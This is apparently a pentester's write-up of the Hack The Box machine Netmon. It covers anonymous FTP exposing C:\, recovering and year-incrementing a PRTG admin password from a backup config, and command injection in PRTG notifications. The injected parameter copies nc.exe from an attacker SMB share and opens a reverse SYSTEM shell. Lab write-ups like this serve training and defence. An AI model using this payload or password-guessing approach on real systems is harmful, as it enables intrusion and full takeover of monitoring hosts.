---
title: 'Netmon'
target: 'Hack The Box — Netmon'
difficulty: 'easy'
date: 2025-12-05
summary: 'An HTB machine — scanning with nmap to find FTP (21) with anonymous login exposing the entire C:\ drive, HTTP (80) running PRTG Network Monitor 18.1.37.13946, MSRPC (135), NetBIOS (139), and SMB (445) on a Windows Server host, grabbing the user flag directly via anonymous FTP from C:\Users\Public\user.txt, identifying PRTG Network Monitor on port 80 and locating its configuration backup files through FTP at C:\ProgramData\Paessler\PRTG Network Monitor\, finding the password PrTg@dmin2018 in the old backup file and incrementing the year to PrTg@dmin2019 for a successful login as prtgadmin, and exploiting the notifications feature to execute a reverse shell command through the Demo exe notification script for NT AUTHORITY\SYSTEM.'
role: 'pentest'
tags: ['nmap', 'ftp', 'anonymous-ftp', 'prtg', 'credential-recovery', 'password-guessing', 'rce', 'notifications', 'impacket', 'smbserver', 'netcat', 'privilege-escalation', 'windows']
problem: 'Netmon is an easy-rated Windows Server machine with five open ports — FTP (21) with anonymous login exposing the entire C:\ filesystem, HTTP (80) running PRTG Network Monitor 18.1.37.13946, MSRPC (135), NetBIOS (139), and SMB (445). Anonymous FTP provides read access to the entire system drive, including the user flag and PRTG configuration backup files containing an old password. The PRTG version has a known authenticated RCE vulnerability through its notification system — the Demo exe notification script accepts parameters that can be injected with arbitrary commands. The old backup password PrTg@dmin2018 doesn''t work directly but incrementing the year to PrTg@dmin2019 grants admin access to the monitoring console.'
action: 'Ran nmap with service version detection and default scripts to identify five open ports — 21/tcp (FTP) with anonymous login exposing the C:\ root, 80/tcp (HTTP) running PRTG Network Monitor 18.1.37.13946, 135/tcp (MSRPC), 139/tcp (NetBIOS), and 445/tcp (SMB). Logged into FTP anonymously and navigated to C:\Users\Public to retrieve user.txt. Browsed to port 80 and found the PRTG Network Monitor login page — version 18.1.37.13946. Searched for PRTG configuration files via FTP at C:\ProgramData\Paessler\PRTG Network Monitor\ and found PRTG Configuration.dat, PRTG Configuration.old, and PRTG Configuration.old.bak. Downloaded PRTG Configuration.old.bak and found the credential PrTg@dmin2018 in plaintext. The 2018 password failed against the login page. Incremented the year to PrTg@dmin2019 and logged in successfully as prtgadmin. Navigated to Setup > Account Settings > Notifications to exploit the authenticated RCE vulnerability. Created a new notification using the Execute Program method with the Demo exe notification script. Injected a command in the Parameter field to copy nc.exe from an attacker-hosted SMB share and execute a reverse shell. Set up impacket-smbserver to serve nc.exe and a netcat listener on port 4455. Triggered the notification and received a reverse shell as NT AUTHORITY\SYSTEM. Retrieved the root flag.'
outcome: 'Gained SYSTEM-level access through anonymous FTP credential recovery and an authenticated PRTG RCE. Anonymous FTP exposed the entire filesystem including the user flag and PRTG backup configuration files, an old password with an incremented year granted admin access to the monitoring console, and command injection through the notification system provided a SYSTEM shell.'
draft: false
---

## Background

Netmon is an easy-rated Windows machine that demonstrates the danger of anonymous FTP access to a system drive and the risks of running monitoring software with default or predictable credentials. The machine is notable for how quickly the user flag falls — anonymous FTP to the entire C:\ drive means it's accessible within seconds of the initial scan. The privilege escalation requires finding credentials in backup configuration files, making an educated guess about a password change, and then exploiting an authenticated RCE in PRTG Network Monitor's notification system. It's a short box, but each step reinforces practical enumeration skills.

---

## Enumeration

An nmap scan against the target reveals five open ports:

```
nmap -sV -sC -p- 10.10.10.152
```

```
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 05-01-19  05:09AM                   84 test.txt
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
```

The nmap output tells almost the entire story upfront. **Anonymous FTP login is allowed** and the directory listing shows the root of the C:\ drive — `inetpub`, `PerfLogs`, `Program Files`, `Users`, `Windows`. This is not a restricted FTP directory; it's the entire system drive exposed through anonymous access. Port 80 is running **PRTG Network Monitor 18.1.37.13946** — a network monitoring tool by Paessler AG.

---

## User flag — anonymous FTP

With anonymous FTP mapped to C:\, the user flag is immediately accessible without any exploitation:

```
ftp 10.10.10.152
```

```
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> cd Users/Public
ftp> get user.txt
```

The user flag was retrieved directly from `C:\Users\Public\user.txt`. No exploitation needed — anonymous FTP to the system root is enough.

---

## PRTG Network Monitor — credential recovery

Port 80 serves the PRTG Network Monitor login page:

![PRTG Network Monitor login page titled PRTG Network Monitor (NETMON) with the PRTG Network Monitor logo in the top right. Login form with Login Name and Password fields and a blue Login button. Links below for Download Client Software (optional, for Windows, iOS, Android), Forgot password, and Need Help. Footer text reads Thank You For Using PRTG Network Monitor with a description of the freeware version's network monitoring capabilities.](/writeups/htb-netmon/01-prtg-login.png)

**PRTG Network Monitor** is an agentless network monitoring tool that tracks uptime, bandwidth, and traffic across an entire network. The version displayed at the bottom — **18.1.37.13946** — has a known authenticated RCE vulnerability. But first, credentials are needed.

PRTG stores its configuration in `C:\ProgramData\Paessler\PRTG Network Monitor\`. Since anonymous FTP exposes the full C:\ drive, these files are directly accessible. The directory contains three configuration files of interest:

- `PRTG Configuration.dat` — the active configuration (credentials encrypted)
- `PRTG Configuration.old` — a previous configuration
- `PRTG Configuration.old.bak` — an older backup

The active configuration file has encrypted credentials, but the backup file `PRTG Configuration.old.bak` contains a password in plaintext — **PrTg@dmin2018**. Testing this against the login page with the default username `prtgadmin` fails — the password has been changed since this backup was made.

The backup is from 2018, and the box's file timestamps are from 2019. A simple year increment — **PrTg@dmin2019** — works, and the `prtgadmin` account is logged in. This is a realistic pattern: administrators who change passwords by incrementing a number are common, and backup configuration files that retain the old password make the pattern trivially discoverable.

---

## Privilege escalation — PRTG notification RCE

Inside the PRTG console, the path to code execution runs through the **Notifications** feature. Navigating to **Setup > Account Settings > Notifications**:

![PRTG Network Monitor interface showing the Setup dropdown menu expanded. Under Tickets: My Account, Notifications (highlighted in blue), Notification Contacts, and Schedules. Under Setup: Overview, Account Settings, System Administration, PRTG Status, License, Auto-Update, Downloads, PRTG API, and Contact Support. Left sidebar shows status indicators with warning and alarm counts. Bottom bar shows Enable SSL encryption warning.](/writeups/htb-netmon/02-prtg-notifications.png)

PRTG's notification system can execute programs when triggered — it's designed for running scripts in response to monitoring alerts. The **Demo exe notification — outfile.ps1** script accepts a parameter field that's vulnerable to command injection. The parameter is passed directly to PowerShell without proper sanitization, allowing additional commands to be appended with a semicolon.

The exploit requires getting a tool onto the target and executing it. Setting up the attack infrastructure on the attacker machine:

```
python /usr/share/doc/python-impacket/examples/smbserver.py hacker .
```

This starts an SMB share serving the current directory (containing `nc.exe`) so the target can pull files from the attacker without needing FTP upload access. In a separate terminal, a netcat listener waits for the reverse shell:

```
nc -lvp 4455
```

Creating a new notification in PRTG with the following configuration — the **Execute Program** method using the demo script, with the Parameter field injected:

```
Program File: Demo exe notification - outfile.ps1
Parameter: t.txt; copy \\10.10.14.x\hacker\nc.exe C:\nc.exe;C:\nc.exe 10.10.14.x 4455 -e cmd.exe
```

The semicolons separate three commands: the original parameter (`t.txt`), copying netcat from the attacker's SMB share, and executing the reverse shell. After saving the notification and triggering it manually through the bell icon, the shell connects back:

![Terminal showing nc -lvp 4455 receiving a connection from 10.10.10.152 port 50273. Microsoft Windows Version 10.0.14393, copyright 2016 Microsoft Corporation. Command prompt at C:\Windows\system32 with whoami returning nt authority\system, followed by type C:\Users\Administrator\Desktop\root.txt to read the root flag.](/writeups/htb-netmon/03-system-shell.png)

**NT AUTHORITY\SYSTEM** — PRTG runs its notification scripts with SYSTEM privileges, so command injection through the notification parameter immediately grants the highest privilege level. The root flag was retrieved.

---

## What I took from this

Netmon is one of the fastest boxes to get user on — anonymous FTP to the system root means the user flag is accessible in the time it takes to type `cd Users/Public`. The real lesson isn't the FTP misconfiguration itself (anonymous access to C:\ is extreme), but the principle it demonstrates: when one service exposes the filesystem, every other service's secrets are compromised. PRTG's configuration files, which should be protected, become readable because FTP access bypasses all filesystem ACLs through the anonymous account.

The password guessing step is worth dwelling on. `PrTg@dmin2018` in a backup file from 2018, failing on a 2019 system, should immediately suggest incrementing the year. This pattern — `Season+Year`, `Company+Year`, `Password+SequentialNumber` — is one of the most common password rotation schemes in real environments. When administrators are forced to change passwords periodically, they often make the minimum possible change, and a year increment is the most predictable version of that. The practical takeaway is that backup configuration files don't just expose the current password — they expose the password scheme, which is often enough to predict the current one.

The PRTG notification RCE is a clean example of why monitoring tools are high-value targets. They run with elevated privileges (SYSTEM in this case), they're designed to execute scripts, and they often have web interfaces that are less hardened than the primary application servers. The notification parameter injection bypasses any complexity around the RCE because the feature is literally designed to run commands — the vulnerability is just that it doesn't properly sanitize the boundary between the intended parameter and injected commands. In a real engagement, any monitoring, management, or orchestration tool running as SYSTEM with a web interface is a priority target.
